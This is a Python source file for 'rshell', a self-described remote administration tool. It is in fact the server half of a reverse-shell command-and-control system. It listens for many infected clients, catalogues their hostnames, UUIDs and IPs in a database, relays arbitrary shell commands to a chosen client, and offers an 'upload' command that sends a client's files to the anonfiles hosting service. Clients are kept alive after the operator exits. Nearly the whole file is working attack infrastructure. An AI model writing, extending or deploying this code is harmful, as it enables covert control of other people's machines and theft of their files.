import os
import sys
import time
import socket
import argparse
import threading
from colorama import Fore
from difflib import get_close_matches

import server.output as output
import server.database as database
## Variables
HOST_IP = '127.0.0.1'
HOST_Port = 90
LOCAL_DATABASE = 'database.db'

#main
def main():
    parser = argparse.ArgumentParser(
        prog='rshell.py',
        description="Remote Administration Tool"
    )

    parser.add_argument(
        '--payload',
        type=str,
        default='none',
        )

    options = parser.parse_args()
    modules = os.path.abspath('modules')
    db = database.data(LOCAL_DATABASE)
    s = server(HOST_IP,HOST_Port,db)
    s.start()
##Clear console function
def clear():
    from os import system, name
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')
    output.banner()
class server():
    def __init__(self,host,port,db):
        self.database = db
        self.host = host
        self.port = port
        self.prompt = ''
        self.clients = []
        self.uuids = []
        self.hostlist = []
        self.nicklist = []
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('0.0.0.0', self.port))
        self.quitting = False
        self.out = ''
        self.commands = {
            'help' : {
                'method': self.help,
                'usage': 'help <command>',
                'description': 'returns info of command'},
            'clear' : {
                'method': clear,
                'usage': 'clear',
                'description': 'clears console'},
            'clients' : {
                'method': self.listclients,
                'usage': 'clients <option>',
                'description': 'print list of clients [options - online]'},
            'search' : {
                'method': self.search,
                'usage': 'search <hostname/nickname>',
                'description': 'searches for clients with relevant hostname or nickname'},
            'info' : {
                'method': self.info,
                'usage': 'info <client id>',
                'description': 'print client information'},
            'nickname' : {
                'method': self.nickname,
                'usage': 'nickname <client id> <nickname>',
                'description': 'sets the nickname for a client (organization and search)'},
            'connect' : {
                'method': self.connect,
                'usage': 'connect <client id>',
                'description': 'reverse shell to client'},
            'upload' : {
                'method': 'none',
                'usage': 'upload (filename)',
                'description': 'uploads clients file to anonfiles'},
            'end' : {
                'method': 'none',
                'usage': 'end',
                'description': 'ends current reverse shell'},
            'kill' : {
                'method': 'none',
                'usage': 'kill',
                'description': 'kills current reverse shell'},
            'exit' : {
                'method': self.end,
                'usage': 'exit',
                'description': 'quits rshell (keeps clients alive)'}
        }

    def help(self,type='none'):
        if type == 'none':
            output.echo('\n{:<15}{:<20}'.format('Command','Description'),'MAGENTA')
            for command,value in self.commands.items():
                output.echo('\n\n{:<15}{:<20}'.format(command,value['description']),'WHITE')
        else:
            if type.lower() in self.commands:
                description = self.commands[type.lower()]['description']
                usage = self.commands[type.lower()]['usage']
                output.echo(f'\nCommand - {type.lower()}\nDescription - {description}\nUsage - {usage}','WHITE')
            else:
                output.echo('\n[!]','RED')
                output.echo(' command does not exist','WHITE')
        print('\n')

    def connect(self,cli):
        breakloop = False
        c = int(cli)
        #check if client exists
        if c > len(self.clients)-1:
                output.echo('\n[!]','RED')
                output.echo(' invalid client\n\n','WHITE')
                breakloop = True
        else:
            client = self.clients[c]
        #check if its online before connecting
        if not self.isOnline(client[0]):
            output.echo('\n[!]','RED')
            output.echo(' client not online\n\n','WHITE')
            breakloop = True
        while True:
            if breakloop:
                break
            try:
                self.prompt = Fore.MAGENTA + f'[client {c}]' + Fore.WHITE + 'rshell> '
                cmd = input(self.prompt)
                cmd_buffer = cmd
                cmd, _, action = cmd_buffer.partition(' ')
                if cmd == 'kill':
                    killed = False
                    while True:
                        output.echo('\n[!]','RED')
                        output.echo(' are you sure you want to kill connection [Y/N]: ','WHITE')
                        inp = input()
                        if inp.lower() == 'y':
                            client[0].send(cmd.encode())
                            killed = True
                            break
                        elif inp.lower() == 'n':
                            output.echo('\n','WHITE')
                            break
                    if killed == True:
                        self.database.remove(self.clients[c])
                        self.clients.pop(c)
                        self.uuids.pop(c)
                        self.hostlist.pop(c)
                        self.nicklist.pop(c)
                        output.echo('\n[!]','RED')
                        output.echo(' connection killed\n\n','WHITE')
                        break
                elif cmd == 'end':
                    output.echo('\n[!]','RED')
                    output.echo(' connection ended\n\n','WHITE')
                    break
                elif cmd == 'upload':
                    cmd = cmd + ' ' + action
                    client[0].send(cmd.encode())
                    cmd_buffer = cmd
                    cmd, _, action = cmd_buffer.partition(' ')
                    print(client[0].recv(1024).decode())
                #if try to connect while connected throw error message
                elif cmd == 'connect':
                    output.echo('\n[!]','RED')
                    output.echo(' already established connection\n\n','WHITE')
                #check for server commands first
                elif cmd in self.commands:
                        method = self.commands[cmd]['method']
                        try:
                            self.out = method(action) if len(action) else method()
                        except Exception as e1:
                            self.out = str(e1)
                #send command to client
                else:
                    cmd = cmd + ' ' + action
                    client[0].send(cmd.encode())
                    cmd_buffer = cmd
                    cmd, _, action = cmd_buffer.partition(' ')
                    #dont do anything if cd will automatically update
                    if(cmd == 'cd'):
                        pass
                    else:
                        #receive input from client and print
                        msg_size = int(client[0].recv(1024).decode())
                        time.sleep(.001)
                        print(client[0].recv(msg_size).decode())
            except:
                output.echo('\n[!]','RED')
                output.echo(' connection ended\n','WHITE')
                break
        self.prompt = Fore.WHITE + 'rshell> '

    def listener(self):
        self.s.listen(100)
        while True:
            try:
                s = self.s.accept()
                newcli = list(s)
                #get comouter name
                hostname = newcli[0].recv(1024).decode()
                # set nickname
                nickname = 'None'
                #get uuid
                uuid = newcli[0].recv(1024).decode()
                info = {'hostname':hostname,'nickname':nickname,'uuid':uuid}
                newcli.append(info)
                #if cant find uuid then dont add client
                if uuid == '':
                    pass
                #determine if exists in list already if it does replace it if it doesnt create new and print message
                elif uuid in self.uuids:
                    #set nickname since it exists and update database information with ip and computer name
                    newcli[2]['nickname'] = self.database.update(newcli)
                    self.clients[self.uuids.index(uuid)] = newcli
                else:
                    output.echo('\n\n[+]','GREEN')
                    output.echo(f' new client {newcli[1][0]}({hostname})\n','WHITE')
                    output.echo(f'\n{self.prompt}','WHITE')
                    #add new client to lists and import to database
                    self.clients.append(newcli)
                    self.uuids.append(uuid)
                    self.hostlist.append(hostname)
                    self.nicklist.append(nickname)
                    self.database.new(newcli)
            except:
                pass

    def task(self,task):
        pass
    def isOnline(self,client):
        #send connectionstatus twice to see if itll receive without error
        try:
            client.send('connectionstatus'.encode())
            time.sleep(.001)
            client.send('connectionstatus'.encode())
            return True
        except:
            return False

    def search(self,action):
        results = []
        for i in range(len(self.hostlist)):
            if len(get_close_matches(action, [self.hostlist[i]])) > 0:
                results.append(i)
            elif len(get_close_matches(action, [self.nicklist[i]])) > 0:
                results.append(i)
        if len(results) == 0:
            output.echo('\n[!]','RED')
            output.echo(' no search results\n','WHITE')
            output.echo('\n','WHITE')
        else:
            output.echo('\n{:<5}{:<20}{:<20}{:<20}{:<8}'.format('id','name','nickname','ip-address','status'),'MAGENTA')
            for x in results:
                client = self.clients[x]
                output.echo('\n\n{:<5}{:<20}{:<20}{:<20}'.format(x,client[2]['hostname'],client[2]['nickname'],client[1][0]),'WHITE')
                if self.isOnline(client[0]):
                    output.echo('{:<8}'.format('Online'),'GREEN')
                else:
                    output.echo('{:<8}'.format('Offline'),'RED')
        output.echo('\n\n','WHITE')

    def nickname(self,action):
        x = action.split()
        if len(x) == 2:
            try:
                c = int(x[0])
                if c > len(self.clients)-1:
                        output.echo('\n[!]','RED')
                        output.echo(' invalid client\n','WHITE')
                else:
                    self.clients[c][2]['nickname'] = x[1]
                    self.database.setnick(self.clients[c])
                    output.echo('\n[✓]','GREEN')
                    output.echo(' nickname set \n','WHITE')
            except:
                output.echo('\n[!]','RED')
                output.echo(' invalid parameters\n','WHITE')
        else:
            output.echo('\n[!]','RED')
            output.echo(' invalid parameters\n','WHITE')
        output.echo('\n','WHITE')

    def info(self,cli):
        c = int(cli)
        #check if client exists
        if c > len(self.clients)-1:
                output.echo('\n[!]','RED')
                output.echo(' invalid client\n\n','WHITE')
        else:
            client = self.clients[c]
            output.echo(f'\n[client {c}]','MAGENTA')
            output.echo(f'\nstatus: ','WHITE')
            if self.isOnline(client[0]):
                output.echo('Online','GREEN')
            else:
                output.echo('Offline','RED')
            hostname = client[2]['hostname']
            nickname = client[2]['nickname']
            uuid = client[2]['uuid']
            output.echo(f'\nip address:  {client[1][0]}','WHITE')
            output.echo(f'\nhost name:  {hostname}','WHITE')
            output.echo(f'\nnickname:  {nickname}','WHITE')
            output.echo(f'\nuuid:  {uuid}\n\n','WHITE')

    def listclients(self,type='none'):
        count = 0
        output.echo('\n{:<5}{:<20}{:<20}{:<20}{:<8}'.format('id','name','nickname','ip-address','status'),'MAGENTA')
        if type.lower() == 'online':
            for item in self.clients:
                if self.isOnline(item[0]):
                    output.echo('\n\n{:<5}{:<20}{:<20}{:<20}'.format(count,item[2]['hostname'],item[2]['nickname'],item[1][0]),'WHITE')
                    output.echo('{:<8}'.format('Online'),'GREEN')
                count += 1
        else:
            for item in self.clients:
                output.echo('\n\n{:<5}{:<20}{:<20}{:<20}'.format(count,item[2]['hostname'],item[2]['nickname'],item[1][0]),'WHITE')
                if self.isOnline(item[0]):
                    output.echo('{:<8}'.format('Online'),'GREEN')
                else:
                    output.echo('{:<8}'.format('Offline'),'RED')
                count += 1
        print('\n')

    def start(self):
        #populate lists from the database
        poplist = self.database.populate()
        self.clients = poplist[0]
        self.uuids = poplist[1]
        self.hostlist = poplist[2]
        self.nicklist = poplist[3]
        #start listening thread to listen for clients in background
        self.listenThread = threading.Thread(target=self.listener)
        self.listenThread.daemon = True
        self.listenThread.start()

        self.prompt = Fore.WHITE + 'rshell> '
        while True:
            try:
                cmd = input(self.prompt)
                cmd_buffer = cmd
                cmd, _, action = cmd_buffer.partition(' ')
                if cmd in self.commands:
                    method = self.commands[cmd]['method']
                    try:
                        self.out = method(action) if len(action) else method()
                    except Exception as e1:
                        self.out = str(e1)
                elif (self.out == ''):
                    output.echo('\n[!]','RED')
                    output.echo(' command does not exist\n\n','WHITE')
                self.out = ''
            except KeyboardInterrupt:
                    self.quitting = True
                    self.end()

    ##Exit Handler
    def end(self):
        self.s.close()
        output.echo('\n[X]','RED')
        output.echo(' quiting rshell\n\n', 'WHITE')
        sys.exit()

if __name__ == "__main__":
    clear()
    main()
